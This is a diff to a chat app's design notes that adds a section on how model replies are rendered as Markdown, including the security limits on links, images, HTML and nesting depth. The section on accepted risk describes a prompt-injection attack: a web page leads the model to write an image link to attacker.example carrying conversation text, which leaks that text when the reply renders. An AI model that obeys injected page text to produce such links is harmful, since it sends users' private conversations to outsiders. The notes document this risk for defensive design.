@@ -149,6 +149,23 @@ Sending is an ordinary request: `send()` adds an optimistic copy of the message 
 
 Loading a conversation's messages on open goes through `apply_loaded_messages`, not a plain replace. The live subscription's reconciliation merge can land first with a message saved after the load's snapshot, and a replace would wipe it.
 
+## Markdown in replies
+
+SME-30. The model's replies (assistant `Text` blocks, and the streaming bubble) render through `crate::markdown::Markdown`; user messages, thinking, notices and tool rows stay plain text. The component parses the text into smelt's own node tree (`markdown::parse`, unit-tested without a browser) and renders Dioxus elements from it, so a reply renders the same on the server and in the browser, and the streaming reply and the saved one produce the same DOM (browser scenario `markdown_streaming`).
+
+**Trust boundary.** A reply is untrusted: the model may repeat text from a web page it read. What it covers:
+
+* No HTML string is ever built and nothing sets `dangerous_inner_html`: raw HTML in a reply (a `<script>`, an `<img onerror>`) shows as literal text.
+* A link becomes an `<a>` only for `http`, `https` and `mailto` (any case); `javascript:`, `data:`, relative and every other destination show their text only. Links open in a new tab with `rel="noopener noreferrer"`.
+* An image loads only from `http`/`https`, lazily and with `referrerpolicy="no-referrer"`; any other source shows its alt text.
+* Quotes and lists nested past `MAX_DEPTH` (16), and separately emphasis, strong, strikethrough and links nested past it, are flattened, so a hostile reply can't make rendering recurse without bound (thousands of nested `*` used to); code over `MAX_HIGHLIGHT_BYTES` (64 KB) isn't highlighted.
+
+What it doesn't cover (accepted, user's decision 2026-09-27, confirmed 2026-10-03): **an image in a reply is fetched without a click.** A prompt-injected page could get the model to write `![](https://attacker.example/?q=<conversation text>)`, and the browser would send that URL when the reply renders. `no-referrer` keeps the page's own address out of the request; the URL itself still leaves. Links aren't followed until clicked.
+
+**Code blocks** (`CodeBlock`): a language label, a copy button (via `navigator.clipboard`; it says "Couldn't copy" if the browser refuses), and the code, highlighted by `crate::highlight` once its closing fence has arrived and its language is known (two-face's grammar set, loaded on first use: the first highlighted block on a page waits for it). Highlighting is classes only; colours live in `assets/highlight.css`, light and dark.
+
+**Sticky scroll.** An image grows its reply after the reply has rendered, so its `onload` calls `Markdown`'s `on_media_load`, which the transcript wires to the same layout-change path a side panel appearing takes (`media_loaded` in `ChatPanel`): re-snap to the bottom, or with the pointer over the transcript keep the text under it still (browser scenario `markdown_late_image`).
+
 ## The live browsing panel
 
 `.browsing-panel` (in `ChatPanel`) is a second, independent live stream from `subscribe_conversation_events`'s — it exists only while the model has a browsing session open (`ConversationEvent::BrowsingSessionUpdate`) and subscribes separately, via `api::browsing::subscribe_browser_frames`, to a per-conversation frame channel that isn't part of `ConversationEvent` at all (frames are frequent, ephemeral, UI-only data that shouldn't crowd out task/message updates in that shared bounded broadcast channel — see `events::ConversationEvent`'s own doc comment). A dedicated `use_effect` (separate from the main event-subscription one) starts/stops that subscription as `browsing_session_open()`/`selected()` change, mirroring the main loop's own `Task`-cancel-on-change shape. If the frame stream drops (a network blip, a server restart), it reconnects after 1.5s, the same delay the main loop uses — unless `get_browsing_state` says the session is gone, in which case the panel closes.
